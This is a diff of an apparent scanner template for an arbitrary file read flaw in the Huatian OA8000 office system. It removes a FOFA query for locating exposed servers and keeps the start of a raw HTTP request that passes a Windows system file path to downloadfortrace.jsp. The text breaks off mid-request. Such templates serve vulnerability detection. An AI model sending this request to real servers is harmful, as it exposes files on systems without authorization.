@@ -3,12 +3,8 @@ info:
   name: 华天动力OA8000 downloadfortrace存在任意文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/izgfral9gyfmty5q'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: izgfral9gyfmty5q
-    fofa: body="/OAapp/WebObjects/OAapp.woa" || body="/OAapp/htpages/app" || body="/OAapp/WebObjects"
 http:
 - raw:
   - 'GET /OAapp/jsp/trace_eWebEditor/downloadfortrace.jsp?filePath=c:/windows/win.ini HTTP/1.1
